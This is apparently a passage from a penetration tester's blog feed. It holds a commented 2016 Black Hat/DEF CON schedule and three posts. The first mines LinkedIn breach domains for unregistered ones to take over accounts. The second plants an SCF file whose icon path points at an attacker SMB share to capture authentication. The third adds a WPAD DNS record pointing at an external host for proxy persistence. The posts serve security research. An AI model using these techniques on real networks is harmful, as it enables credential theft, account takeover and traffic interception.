&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#captain-hook-pirating-avs-to-bypass-exploit-mitigations-4057&#34;&gt;Captain Hook: Pirating AVs to bypass exploit mitigations&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Always interested in how to break AVs ;-)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;5:30 - 6:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#building-a-product-security-incident-response-team-learnings-from-the-hivemind-4382&#34;&gt;Building a product security incident response team: Learning from the hivemind&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;This is a question I thought a lot about, curious on new solutions&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#unleash-the-infection-monkey-a-modern-alternative-to-pen-tests-3380&#34;&gt;Unleash the infection monkey: A modern alternative to pen-tests&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Curious how someone automated me&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;aug-4-thursday&#34;&gt;Aug 4 - Thursday&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;9:00 - 9:25

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#badtunnel-how-do-i-get-big-brother-power-3915&#34;&gt;Badtunnel : How do I get big brother power?&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Morbid curiosity. Go read the abstract, you&amp;rsquo;ll understand.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;9:45 - 10:35

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#the-remote-malicious-butler-did-it-2781&#34;&gt;The remote malicious butler did it!&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Rogue Domain Controllers and kerberos? I&amp;rsquo;m game. It&amp;rsquo;s from the Microsoft ATA guys, so might end like an advertisement.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;11:00 - 11:50

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#cunning-with-cng-soliciting-secrets-from-schannel-3995&#34;&gt;Cunning with CNG: Soliciting secrets from Schannel&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Pulling keys out of Windows systems to decrypt TLS/SSL traffic? swweeeeet!!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;12:10 - 1:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#airbnbeware-short-term-rentals-long-term-pwnage-2891&#34;&gt;AirBNBware: Short term rentals, long term pwnage&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I&amp;rsquo;ve used AirBnB and these thought did cross my mind when the person&amp;rsquo;s welcome sheet included their WPA password.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#badwpad-3216&#34;&gt;BadWPAD&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;DNS purchases to get WPAD requests, interested if they have anything new&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2:30 - 3:20

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#bad-for-enterprise-attacking-byod-enterprise-mobile-security-solutions-2751&#34;&gt;Bad for enterprise: Attacking BYOD enterprise mobile security solutions&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Release of a tool called &amp;ldquo;Swizzler&amp;rdquo; to automate breaking &amp;ldquo;secure enclave&amp;rdquo; mobile apps? Swweeet!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;3:50 - 4:40

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#the-beast-within---evading-dynamic-malware-analysis-using-microsoft-com-3225&#34;&gt;The beast within: Evading Dynamic Malware Analysis using Microsft COM&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;COM object fun? Don&amp;rsquo;t have to tell me twice&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;def-con&#34;&gt;DEF CON&lt;/h1&gt;

&lt;h2 id=&#34;aug-4-thursday-1&#34;&gt;Aug 4 - Thursday&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;12:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Metcalf&#34;&gt;Beyond the MCSE: Red Teaming Active Directory&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;This talk is also at BlackHat, only reason I didn&amp;rsquo;t list it there was because it will probably be a packed room like it was last year.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;aug-5-friday&#34;&gt;Aug 5 - Friday&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;10:00

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Grand&#34;&gt;BSodomizer HD: A mischievous FPGA and HDMI platform for the (m)asses&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;An FPGA based HDMI board that can rewrite displays as the old one did, but also intercept, and record screenshots.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;11:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Zatko&#34;&gt;Project CITL&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;This is the Underwriters Lab for &amp;ldquo;Cyber&amp;rdquo; (but as the abstract says, without any type of certifications or seals of approval)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;12:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Zhong&#34;&gt;411: A framework for managing security alerts&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I know of a lot of firms that have switched to ELK, they gave this talk at &amp;ldquo;ElastiCON&amp;rdquo;, &lt;a href=&#34;https://speakerdeck.com/elastic/whats-the-411-building-alerts-on-elasticsearch-at-etsy&#34;&gt;here are the slides&lt;/a&gt; where they listed a &lt;a href=&#34;https://github.com/Etsy/411&#34;&gt;Github 411 project&lt;/a&gt;, but it doesn&amp;rsquo;t seem to be released yet. Hope they do so at Def Con&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;12:30

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Vixie&#34;&gt;Frontrunning the frontrunners&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;DNS NXDomain response registration of new domains? Who doesn&amp;rsquo;t love DNS?&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#sixvolts&#34;&gt;Cheap tools for hacking heavy trucks&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I have family members who are truck drivers so this directly impacts their safety.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2:00

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#int0x80&#34;&gt;Anti-Forensics AF&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;int0x80 talking about anti-forensics techniques.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;4:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Cecil&#34;&gt;Robot hacks video games: How TASBot exploits consoles with custom controllers&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;They used Nintento R.O.B. to hack consoles. We &amp;ldquo;Rob&amp;rdquo;s have to stick together.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;4:30

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#MrRobotPanel&#34;&gt;Mr. Robot Panel&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;This room will be packed. I mainly want to go to ask a question:&lt;/li&gt;
&lt;li&gt;Do they think they are hurting the hacker community by sensationalizing &amp;ldquo;FSociety&amp;rdquo; as a positive influence in the Mr. Robot world? Feel free to comment below or hit me up on Facebook/Twitter one what you think.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;aug-6-saturday&#34;&gt;Aug 6 - Saturday&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;10:00

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Holland&#34;&gt;Developing Managed Code Rootkits for Java Runtime Environment&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I love MCRs and a JRE MCR sounds awesome, especially with all the server-side Java that exists these days&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Fasel&#34;&gt;I fight for the users, Episode 1 - Attacks against top consumer products&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Got the inside scoop that there &lt;em&gt;might&lt;/em&gt; be some additions/updates to ZackAttack (&lt;em&gt;finally&lt;/em&gt;) coming in this talk.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;11:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Rose&#34;&gt;Picking Bluetooth Low-Energy locks from a quarter mile away&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Sounds like a good talk about actually doing things with BLE locks and release of tools. w00tw00t!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;12:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Bugher&#34;&gt;Bypassing captive portals and limited networks&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Bypassing portals, I&amp;rsquo;m down, I just hope it&amp;rsquo;s not just DNS tunneling&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;13:00

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://bsideslv2016.sched.org/event/7azR/six-degrees-of-domain-admin-using-bloodhound-to-automate-active-directory-domain-privilege-escalation-analysis&#34;&gt;Six Degrees of Domain Admin - Using &amp;ldquo;BloodHound&amp;rdquo; to automate Active Directory domain privilege escalation analysis&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;If you missed the BSidesLV version, here it is again. Graph theory applied to derivative admin, what&amp;rsquo;s not to love?&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#cunning-with-cng-soliciting-secrets-from-schannel-3995&#34;&gt;Cunning with CNG: Soliciting secrets from Schannel&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;This talk is also at BlackHat, so if I miss this I can see it here.&lt;/li&gt;
&lt;li&gt;Pulling keys out of Windows systems to decrypt TLS/SSL traffic? swweeeeet!!&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;14:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Dawes&#34;&gt;Universal Serial aBUSe: Remote physical access attacks&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;A new piece of USB hardware and software? Yes please. Plus, it&amp;rsquo;s Sensepost.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;15:00

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Beale&#34;&gt;Phishing without failure and frustration&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Always interested in story time with Jay and Larry, but also no matter how many times you send a phishing campaign, there are always new ideas and methods to be learned. Not sure why it&amp;rsquo;s in the 101 track.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;17:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Maldonado&#34;&gt;Sticky keys to the kingdom: Pre-auth RCE is more common than you think&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;They didn&amp;rsquo;t mention sticky keys in their abstract but it&amp;rsquo;s in the title so I&amp;rsquo;m assuming the tool release has something to do with that. Awesome either way.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;aug-7-sunday&#34;&gt;Aug 7 - Sunday&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;11:00

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Mike&#34;&gt;Use their machines against them: Loading code with a copier&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I&amp;rsquo;ve use copier and printers for a number of things, but hosting PowerSploit tools via Excel somehow seems really interesting&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;12:00&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.defcon.org/html/defcon-24/dc-24-speakers.html#Lawshae&#34;&gt;Let&amp;rsquo;s get physical: Network attacks against physical security systems&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Attacking physical security systems is still a dark art to me, definitely into learning more about how it&amp;rsquo;s done.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;16:30 Closing Ceremonies&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Linkedin NXDOMAINs - Purchased Pwnage</title>
      <link>https://room362.com/post/2016/linkedin-nxdomains/</link>
      <pubDate>Fri, 17 Jun 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/linkedin-nxdomains/</guid>
      <description>&lt;p&gt;I recently asked a friend if I could have just a list of the domains in the LinkedIn dump, no passwords, not full emails, just domains. I run a program that I lovingly call &amp;ldquo;DeepMagic&amp;rdquo; and I feed it domains whenever I can. Well, this time when I tossed the list of domains into the engine it started spitting out tons of errors. There was a total of &lt;strong&gt;9,436,804&lt;/strong&gt; unique domains names in the list, and for anyone who works with DNS that isn&amp;rsquo;t a very big number, so I didn&amp;rsquo;t think very much of it and didn&amp;rsquo;t know why it would choke on a list that small.&lt;/p&gt;

&lt;p&gt;When I looked at the logs I noticed that there was a very large percentage of the domains that were coming up with NXDOMAIN. Most of the time this means that the domain isn&amp;rsquo;t registered, but can also mean that no name servers are registered for the domain (this usually happens when a corporation doesn&amp;rsquo;t want to maintain the domain but still wants to hold onto it for brand management).&lt;/p&gt;

&lt;p&gt;I let the resolution keep going and just parsed out all of the NXDOMAINs, but when I saw the list of NXDOMAINs go over 90,000 and I wasn&amp;rsquo;t even out of the &amp;lsquo;A&amp;rsquo;s yet, I took a different approach. I sorted the list by count to find the most used domains (using of course my favorite &lt;code&gt;sort | uniq -c | sort -n&lt;/code&gt; that I think everyone who&amp;rsquo;s ever done text parsing on Linux knows).&lt;/p&gt;

&lt;p&gt;It lead to a few surprises, first, people still use AOL and earthlink?&lt;/p&gt;

&lt;p&gt;Second&amp;hellip; well just look for yourself:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;32952409 gmail.com
24071552 hotmail.com
20421035 yahoo.com
4283225 aol.com
1983431 comcast.net
1431727 yahoo.co.in
1337019 msn.com
1041953 sbcglobal.net
1039635 rediffmail.com
995709 yahoo.fr
916458 yahoo.co.uk
845570 live.com
841415 yahoo.com.br
750175 hotmail.co.uk
742597 verizon.net
575381 hotmail.fr
530308 ymail.com
529548 cox.net
510463 bellsouth.net
504339 libero.it
480006 att.net
429760 yahoo.es
407687 btinternet.com
396313 mail.ru
376970 googlemail.com
307292 earthlink.net
304012 mac.com
266076 yahoo.in
262010 yahoo.ca
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ve never heard of rediffmail, you?&lt;/p&gt;

&lt;p&gt;Anyways, I pushed the list in this order into a simple script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat domains_count.txt | xargs -P 100 -n 2 sh -c &#39;./findnx2.sh $1 $2&#39; argv0 | tee nxdomains.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is what is in &lt;code&gt;findnx2.sh&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
lines=$(nslookup ${2} | grep NXDOMAIN | wc -l)
if [ $lines -eq &amp;quot;1&amp;quot; ]
then
	echo &amp;quot;$2 is open with count $1&amp;quot;
fi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And out popped a pretty interesting list (top 50):&lt;/p&gt;

&lt;p&gt;domain -&amp;gt; number of email accounts registered under that domain (based on number of occurrences of the domain in the unfiltered list):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;XXXXXXXXXXX is open with count 7606
hotmail.con is open with count 4367
c2i.net is open with count 3966
yahoo.con is open with count 3487
gmail.con is open with count 3249
90wewhelp.ru is open with count 3218
csupomona.edu is open with count 2844
us.ing.com is open with count 2622
test.linkedin.com is open with count 2583
wowhackgold.com is open with count 2515
yahoo.om is open with count 2461
alltel.net is open with count 6565
w.cn is open with count 2451
uolsinectis.com.ar is open with count 2315
gmail.fr is open with count 2830
gmail.om is open with count 2122
hotmail.cm is open with count 2044
alltel.com is open with count 2046
hotmail.om is open with count 1901
memo.ikea.com is open with count 1809
chicagogsb.edu is open with count 1758
gawab.com is open with count 2141
mscd.edu is open with count 1740
mayalasr.com is open with count 1626
yavvaram.com is open with count 1424
twtelecom.com is open with count 1448
asbada5m.com is open with count 1371
eunet.yu is open with count 1272
camerabuy.info is open with count 1156
mywdo.com is open with count 1275
g.mail.com is open with count 1089
nortelnetworks.com is open with count 1815
infotechsw.com is open with count 1040
saugov.sa.gov.au is open with count 1033
hoyllmail.com is open with count 1028
mn.rr.com is open with count 1029
apollogrp.edu is open with count 980
gemail.com is open with count 1086
v4q.info is open with count 928
hoylmail.com is open with count 915
yahoo.coom is open with count 890
ifrance.com is open with count 917
justafou.com is open with count 886
2008radiochat.info is open with count 879
myclearwave.net is open with count 967
tconl.com is open with count 939
gmail.cim is open with count 849
flykingfisher.com is open with count 866
lycos.co.uk is open with count 1092
pichosti.info is open with count 813
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Basic analysis of this list:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;I thought that LinkedIn validated sign ups with an email, kinda hard to do with all these domains that are obviously mistyped, unless of course they just keep the database record around indefinitely&lt;/li&gt;
&lt;li&gt;XXXXXXXXX is an ISP that went out of business in 2011, their domain is available for register and would probably mean 7606 accounts up for grabs, if not more that&amp;rsquo;s why I redacted it, but I wanted to mention it just to demonstrate how powerful this type of analysis of a hacked site&amp;rsquo;s dump can be. $10 to purchase a domain is much cheaper and more wide spread than cracking time passwords just for LinkedIn (well, one can dream that everyone uses unique passwords).&lt;/li&gt;
&lt;li&gt;WoWHackGold was also up for grabs, I picked it up just to see what kind of traffic is still going to it, these guys sold hacked WoW accounts so I don&amp;rsquo;t particularly feel inclined protect their info.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;What can someone do with this knowledge? Well, all they have to do to reset any of the accounts registered with one of these domains is simply purchase it, set up a catch-all email address and watch the account information roll in. The &amp;ldquo;accounts&amp;rdquo; they would have access to isn&amp;rsquo;t limited to LinkedIn either, could be anything that people use email addresses to sign up for.&lt;/p&gt;

&lt;p&gt;/mubix&lt;/p&gt;

&lt;p&gt;P.S. I have seen account take-overs of GMail accounts using &amp;ldquo;backup&amp;rdquo; accounts in this way. I assume Google has too since they ask me every so often now to make sure my backup email is correct.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SMB/HTTP Auth Capture via SCF File</title>
      <link>https://room362.com/post/2016/smb-http-auth-capture-via-scf/</link>
      <pubDate>Tue, 14 Jun 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/smb-http-auth-capture-via-scf/</guid>
      <description>

&lt;p&gt;Recently saw a link to an SCF file. Didn&amp;rsquo;t know what those were
so I went digging. Turns out they are a simple text based file that
controls Windows Explorer. ;-)&lt;/p&gt;

&lt;p&gt;Here are the examples I found via the references:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Open Explorer&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[Shell] 
Command = 2 
IconFile = explorer.exe, 1
[Taskbar] 
Command = Explorer
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Open &amp;ldquo;Channels&amp;rdquo; page in IE:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[Shell]
Command=3
IconFile=shdocvw.dll,-118
[IE]
Command=Channels
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This didn&amp;rsquo;t work for me at all, probably because Internet Explorer doesn&amp;rsquo;t have &amp;ldquo;Channels&amp;rdquo; anymore.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Minimize all windows:&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[Shell]
Command=2
IconFile=explorer.exe,3
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My first attempt to utilize this file format for fun was of course
to just set the IconFile to an SMB share:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[Shell]
Command=2
IconFile=\\192.168.1.101\share\test.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;and that worked as expected, every time the share was opened, whoever
opened that folder it automatically attempted to authenticate to the
share that I specified. Lots easier than writing an LNK file.&lt;/p&gt;

&lt;p&gt;My gut is telling me there is more to this file format than meets the
eye, especially when there are malware writers using it as well. I
haven&amp;rsquo;t been able to get my hands on one to see what they are doing
inside the file, but I assume it&amp;rsquo;s not just to minimize all windows.&lt;/p&gt;

&lt;p&gt;There are some hints that you can invoke COM objects.. who knows&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;references&#34;&gt;References:&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://git.reactos.org/?p=reactos.git;a=commitdiff;h=f655c2aca94bcbd04677c9a1c874740f1f9adbd7&#34;&gt;https://git.reactos.org/?p=reactos.git;a=commitdiff;h=f655c2aca94bcbd04677c9a1c874740f1f9adbd7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.blitzmax.com/Community/posts.php?topic=76323&#34;&gt;http://www.blitzmax.com/Community/posts.php?topic=76323&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&#34;&gt;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.programmershare.com/2403039/&#34;&gt;http://www.programmershare.com/2403039/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>WPAD Persistence</title>
      <link>https://room362.com/post/2016/wpad-persistence/</link>
      <pubDate>Sun, 22 May 2016 21:55:12 -0400</pubDate>
      
      <guid>https://room362.com/post/2016/wpad-persistence/</guid>
      <description>

&lt;p&gt;Mostly just writing this so I can keep notes.&lt;/p&gt;

&lt;p&gt;Today I came up with the idea to forcibly put the WPAD entry into a Windows Domain&amp;rsquo;s DNS. For those who don&amp;rsquo;t know what this would do there is an entire Wikipedia article on the subject: &lt;a href=&#34;https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol&#34;&gt;https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I did this via PowerShell pretty easily on one of the domain controllers like so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-DnsServerResourceRecordA -Name wpad -ZoneName sittingduck.info -IPv4Address 107.170.50.74
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Where 107.170.50.74 is the Digital Ocean box I stood up external to my test domain. I installed a basic web server and went to test my brilliant idea, but I wasn&amp;rsquo;t getting any requests for &lt;code&gt;wpad.dat&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As they say &amp;ldquo;there are no more original ideas&amp;rdquo; it looks like the awesome people at Microsoft not only had this idea but fixed it way back in 2008.&lt;/p&gt;

&lt;p&gt;but.. they also made a way to disable it - &lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc995158.aspx&#34;&gt;Removing WPAD from DNS block list&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Running the DNS entry update will propagate throughout the domain so you only have to set that once, however the block list is per domain controller (or DNS server if they are separated, which is rare these days as it&amp;rsquo;s a required service in later Windows server versions).&lt;/p&gt;

&lt;p&gt;I went in search of a registry key to make the modification because it&amp;rsquo;s much easier to hit the &lt;code&gt;RemoteRegistry&lt;/code&gt; service on all the DCs than it is to run that command. I quickly found this blog post - &lt;a href=&#34;http://dns-info.blogspot.com/2009/01/enableglobalqueryblocklist-registry-key.html&#34;&gt;EnableGlobalQueryBlockLisst registry key&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A quick batch script to loop through each DomainController in the domain and I started getting a bunch of requests.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[22/May/2016:21:56:28 EDT] &amp;quot;GET /wpad.dat HTTP/1.1&amp;quot; 200 58
- -&amp;gt; /wpad.dat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, you may be asking, &amp;ldquo;How is setting their proxy server any kind of real persistence?&amp;rdquo;, I implore you to go check out projects like &lt;a href=&#34;https://mitmproxy.org/&#34;&gt;mitmproxy&lt;/a&gt;, &lt;a href=&#34;https://github.com/byt3bl33d3r/MITMf&#34;&gt;mitmf&lt;/a&gt; and &lt;a href=&#34;https://github.com/secretsquirrel/BDFProxy&#34;&gt;BDFProxy&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pentesters have been recommending for years to put a WPAD entry into DNS to protect against LAN based attackers with Responder. Who knew it actually didn&amp;rsquo;t do anything because Microsoft was blocking those lookups anyways. So, if you have better solutions for WPAD on an Enterprise domain please leave a comment below. (Turning off the setting is a per-user per-system setting and doesn&amp;rsquo;t disable it for the SYSTEM or other local accounts, so it&amp;rsquo;s harder than just &amp;ldquo;flip on this registry setting via GPO&amp;rdquo;)&lt;/p&gt;

&lt;p&gt;Oh and I&amp;rsquo;ll just leave this here: &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ee309366%28v=vs.85%29.aspx&#34;&gt;Proxy servers and WinRM&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;references&#34;&gt;References&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc995158.aspx&#34;&gt;Removing WPAD from DNS block list&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://dns-info.blogspot.com/2009/01/enableglobalqueryblocklist-registry-key.html&#34;&gt;EnableGlobalQueryBlockLisst registry key&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ee309366%28v=vs.85%29.aspx&#34;&gt;Proxy servers and WinRM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mitmproxy.org/&#34;&gt;mitmproxy&lt;/a&gt;&lt;/li&gt;
